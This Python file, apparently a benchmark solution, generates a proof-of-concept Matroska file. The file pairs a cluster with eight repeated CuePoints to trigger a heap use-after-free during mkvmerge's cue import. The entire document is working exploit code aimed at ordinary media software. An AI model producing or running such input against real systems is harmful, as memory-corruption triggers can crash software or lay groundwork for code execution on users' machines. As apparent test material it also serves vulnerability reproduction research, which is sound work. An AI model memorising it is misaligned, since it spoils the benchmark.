import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability.
        The PoC is a Matroska (MKV) file containing a specific arrangement of
        Cluster and Cues elements to trigger unsafe vector reallocation during
        cue sheet import.
        """
        
        def encode_vint(num):
            """Encode an integer as an EBML Variable Integer."""
            if num < 0x80:
                return bytes([num | 0x80])
            elif num < 0x4000:
                return bytes([(num >> 8) | 0x40, num & 0xFF])
            elif num < 0x200000:
                return bytes([(num >> 16) | 0x20, (num >> 8) & 0xFF, num & 0xFF])
            else:
                raise ValueError("Size too large for PoC generation")

        def make_element(id_bytes, payload):
            """Create an EBML element with ID, encoded length, and payload."""
            return id_bytes + encode_vint(len(payload)) + payload

        # 1. EBML Header
        # Minimal header with DocType "webm" to satisfy basic parsing
        ebml_header = make_element(b'\x1A\x45\xDF\xA3', 
            make_element(b'\x42\x82', b'webm')
        )

        segment_body = bytearray()

        # 2. Tracks Element
        # Define a minimal Track 1 (Video) to be referenced by Cues/Cluster
        track_entry_payload = (
            make_element(b'\xD7', b'\x01') + # TrackNumber: 1
            make_element(b'\x83', b'\x01') + # TrackType: 1 (Video)
            make_element(b'\x86', b'A')      # CodecID: "A"
        )
        tracks = make_element(b'\x16\x54\xAE\x6B', 
            make_element(b'\xAE', track_entry_payload)
        )
        segment_body.extend(tracks)

        # 3. Cluster Element
        # A Cluster with a Block for Track 1 at Time 0.
        # This causes mkvmerge to generate an internal cue/seekpoint for this cluster.
        block_data = b'\x81\x00\x00\x00' # Track 1 (0x81), Time 0 (0x0000), Flags 0 (0x00)
        cluster_payload = (
            make_element(b'\xE7', b'\x00') + # Timecode: 0
            make_element(b'\xA3', block_data) # SimpleBlock
        )
        cluster = make_element(b'\x1F\x43\xB6\x75', cluster_payload)
        segment_body.extend(cluster)

        # 4. Cues Element
        # Contains multiple CuePoints. During import, these are processed.
        # The interaction between the imported cues and the automatically generated
        # seekpoints (from the Cluster) triggers the Use-After-Free condition
        # when the internal vector reallocates.
        cue_point_content = (
            make_element(b'\xB3', b'\x00') + # CueTime: 0
            make_element(b'\xB7',            # CueTrackPositions
                make_element(b'\xF7', b'\x01') + # CueTrack: 1
                make_element(b'\xF1', b'\x00')   # CueClusterPosition: 0
            )
        )
        cue_point = make_element(b'\xBB', cue_point_content)
        
        # 8 CuePoints to ensure vector reallocation and fill the file size to ~159 bytes
        cues_payload = cue_point * 8
        cues = make_element(b'\x1C\x53\xBB\x6B', cues_payload)
        segment_body.extend(cues)

        # Wrap segment body in Segment element
        segment = make_element(b'\x18\x53\x80\x67', segment_body)

        return ebml_header + segment